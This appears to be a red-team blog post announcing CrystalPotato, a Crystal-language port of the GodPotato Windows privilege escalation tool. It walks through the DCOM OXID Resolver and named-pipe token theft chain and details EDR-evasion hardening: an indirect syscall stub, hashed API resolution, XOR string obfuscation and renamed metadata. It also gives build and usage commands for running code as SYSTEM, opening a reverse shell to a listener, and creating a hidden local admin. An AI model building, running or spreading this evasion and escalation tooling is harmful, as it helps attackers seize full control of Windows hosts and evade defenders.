# https://ricardojoserf.github.io/crystalpotato/

# CrystalPotato - GodPotato in Crystal

September 1, 2026[Tools](https://ricardojoserf.github.io/categories/#tools) [Red Team](https://ricardojoserf.github.io/categories/#red-team) [Malware Development](https://ricardojoserf.github.io/categories/#malware-development)

CrystalPotato is a Crystal port of GodPotato, a local privilege escalation tool that abuses the DCOM OXID Resolver and named pipe impersonation to escalate from service accounts with `SeImpersonatePrivilege` to `NT AUTHORITY\SYSTEM`.

Repository: [https://github.com/ricardojoserf/CrystalPotato](https://github.com/ricardojoserf/CrystalPotato)

![CrystalPotato](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_1.png)

* * *

## Background

[GodPotato](https://github.com/BeichenDream/GodPotato) is a well-known privilege escalation technique that works across a wide range of Windows versions (8 through 11, Server 2012 through 2022). It targets any process running with `SeImpersonatePrivilege`, which includes IIS application pools, MSSQL service accounts, Network Service and Local Service. The original tool is written in C# and, while effective, carries the usual .NET trade-offs: it requires the CLR, is easy to decompile, and its strings and class names are trivially visible in the assembly metadata.

I ported it to Crystal to produce a binary with a smaller forensic footprint, and I tested it on Windows 10, 11 and Server 2025.

* * *

## Why Crystal

[Crystal](https://crystal-lang.org/) is a statically typed, compiled language with Ruby-like syntax. It compiles to native code via LLVM, producing standalone executables with no runtime dependency. Several properties make it interesting for offensive development:

- **Native binaries**: Crystal compiles to a single PE on Windows with no interpreter, VM or runtime to deploy alongside it.

- **Compile-time macros**: Crystal’s macro system executes arbitrary logic at compile time, which can be used for string obfuscation, code generation and other transformations that happen before the binary is produced.

- **Inline assembly**: Crystal supports LLVM inline assembly with AT&T syntax, register constraints and clobber lists, which enables implementing indirect syscall stubs and PEB walking entirely within Crystal source files.

- **Direct C interop**: Crystal can call C functions and Windows API functions directly through its `lib` FFI bindings, with no wrapper libraries needed.

- **Low analyst familiarity**: Crystal is rarely seen in malware samples, which means analysts and automated tooling are less likely to have signatures or heuristics tuned for Crystal-compiled binaries.

- **No reflection metadata**: Unlike .NET assemblies, Crystal binaries do not embed rich type metadata that can be trivially decompiled back to source code.


* * *

## The Technique

The privilege escalation chain used by CrystalPotato (and the original GodPotato) works as follows:

1. **RPC hook**: The tool locates the OXID Resolver’s RPC dispatch table inside `combase.dll` by searching for the well-known interface GUID. It then patches the first entry in the dispatch table to redirect `UseProtseq` calls to a custom hook function.

2. **Named pipe server**: A named pipe is created with a permissive DACL. The hook function injects the pipe’s endpoint address into the RPC binding, causing the OXID Resolver (running as SYSTEM) to connect to our pipe.

3. **DCOM trigger**: A COM object is marshaled and then unmarshaled with a crafted `OBJREF` structure pointing to `127.0.0.1` over TCP. This forces the OXID Resolver to resolve the object reference, which triggers the hooked `UseProtseq` function.

4. **Token capture**: When SYSTEM connects to the named pipe, `ImpersonateNamedPipeClient` captures its security context. The tool then enumerates all system handles to find a SYSTEM token with `Impersonation` level and sufficient integrity, duplicates it, and uses it to create a new process via `CreateProcessAsUserW` (falling back to `CreateProcessWithTokenW`).


The entire chain runs in-process with no child process spawned until the final action. Once the SYSTEM token is obtained, CrystalPotato supports three modes: **command execution** (run a command and capture its output), **reverse shell** (connect back to a listener and bridge a shell’s I/O over the socket), and **local admin creation** (`net user` \+ `net localgroup Administrators`).

* * *

## OPSEC Hardening

The main contribution of this port beyond the language change is a set of OPSEC improvements designed to reduce the binary’s signature surface.

### Indirect Syscalls

CrystalPotato does not call `Nt*` functions through ntdll’s exports. Instead, it resolves each syscall’s System Service Number (SSN) at runtime using the Exception Directory technique described by [MDSec](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/):

1. Walk the PEB’s `InLoadOrderModuleList` to find ntdll’s base address.
2. Read ntdll’s Exception Directory (`IMAGE_DATA_DIRECTORY[3]`), which lists every function’s start address in order.
3. For each runtime function entry, look up the matching export name. Functions prefixed with `Zw` are syscall stubs; their position in the sorted exception table determines their SSN.
4. When the target hash matches, record the SSN and the function’s address.

With the SSN in hand, a 21-byte stub is written to a `PAGE_EXECUTE_READWRITE` region (allocated once during init):

```
mov r10, rcx          ; standard syscall ABI
mov eax, <SSN>        ; system service number
mov r11, <ntdll+0x12> ; jump target inside ntdll's syscall stub
jmp r11               ; indirect jump — the syscall instruction executes inside ntdll
```

The `jmp` lands at `ntdll!NtXxx+0x12`, which is the `syscall` instruction inside the legitimate stub. This means the actual `syscall` executes from ntdll’s `.text` section, making the call indistinguishable from a normal ntdll invocation from the kernel’s perspective. Unlike direct syscalls, this approach does not trigger EDR detections based on the return address being outside ntdll.

The ten syscalls resolved this way are: `NtClose`, `NtQuerySystemInformation`, `NtOpenProcess`, `NtOpenProcessToken`, `NtOpenThreadToken`, `NtDuplicateToken`, `NtQueryInformationToken`, `NtDuplicateObject`, `NtWaitForSingleObject` and `NtProtectVirtualMemory`.

### Dynamic API Resolution

Beyond syscalls, CrystalPotato also resolves all sensitive Win32 API functions dynamically at runtime instead of linking them statically. This keeps function names like `CreateNamedPipeW`, `ImpersonateNamedPipeClient`, `CreateProcessAsUserW`, `CreateProcessWithTokenW` and `ConvertStringSecurityDescriptorToSecurityDescriptorW` out of the binary’s Import Address Table entirely.

Resolution works by walking the PEB to find each DLL’s base address, then parsing its export table and matching function names against precomputed DJB2 hashes. The DJB2 hash function uses uppercase normalization (`h = 5381; h = ((h << 5) + h) + upper(c)`) so comparisons are case-insensitive.

The only functions that remain in the IAT are those needed for COM marshaling (ole32), memory management (GlobalAlloc/Lock/Unlock), pipe creation for stdout capture (CreatePipe), thread creation, and Winsock networking for the reverse shell mode (ws2\_32) — none of which are individually suspicious.

### Compile-Time String Obfuscation

All strings that reveal the tool’s behavior are XOR-obfuscated at compile time using a Crystal macro. The `obf()` macro takes a string literal, XORs each byte with a fixed key at compile time, and emits the encoded bytes as a constant array. At runtime, the bytes are decoded back to a string. This means the plaintext strings never appear in the binary’s `.rdata` section.

The obfuscated strings include: named pipe paths, protocol identifiers (`ncacn_ip_tcp`, `ncacn_np`), SDDL security descriptors, well-known SIDs (`S-1-5-18`), IP addresses (`127.0.0.1`), command-line flag definitions, all debug and error messages, and all exception strings.

Usage is transparent:

```
combase_name = obf("combase.dll").to_utf16
```

### RTTI Name Sanitization

Crystal embeds struct and class names as RTTI metadata in the compiled binary. Names like `RpcServerInterface`, `RpcDispatchTable`, `MidlServerInfo` or `SystemHandleTableEntryInfoEx` immediately tell an analyst what the tool is doing. All structs with revealing names have been renamed to short, meaningless identifiers (`Ri`, `Rd`, `Mi`, `He`, etc.) that carry no semantic information.

### Silent by Default

By default, the tool produces no output other than the executed command’s stdout. Diagnostic messages are gated behind two debug levels: `-d` shows operational progress (hook status, pipe events, token search result), while `-dd` adds the full internal trace (SSN resolution, handle table walks, syscall return codes). A successful execution with no flags leaves no console artifacts beyond the command output itself.

* * *

## Build

CrystalPotato compiles to a single file with no dependencies. I recommend using [Crystal on Windows](https://crystal-lang.org/install/on_windows/) instead of cross-compilation:

```
crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static
```

* * *

## Usage

Execute a command, start a reverse shell, or create a local admin:

```
CrystalPotato.exe -c <COMMAND>
CrystalPotato.exe -H <LHOST> -P <LPORT> [-c <SHELL>]
CrystalPotato.exe -u <USER> -pw <PASS>
```

| Flag | Description |
| --- | --- |
| `-c CMD` | Command to execute as SYSTEM, or shell for reverse shell (default: `cmd.exe`) |
| `-H HOST` | Reverse shell listener Host |
| `-P PORT` | Reverse shell listener Port |
| `-u USER` | Create local admin - Username |
| `-pw PASS` | Create local admin - Password |
| `-p NAME` | Custom pipe name (default: `Crystal`) |
| `-d` | Debug output |
| `-dd` | Full trace |
| `-h` | Show help |

![CrystalPotato](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_2.png)

* * *

## Sources

- [GodPotato](https://github.com/BeichenDream/GodPotato) \- Original C# implementation by [BeichenDream](https://github.com/BeichenDream).
- [RustPotato](https://github.com/safedv/RustPotato) \- Rust implementation by [safedv](https://github.com/safedv).
- [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) \- C# implementation with extra functionalities by [tylerdotrar](https://github.com/tylerdotrar).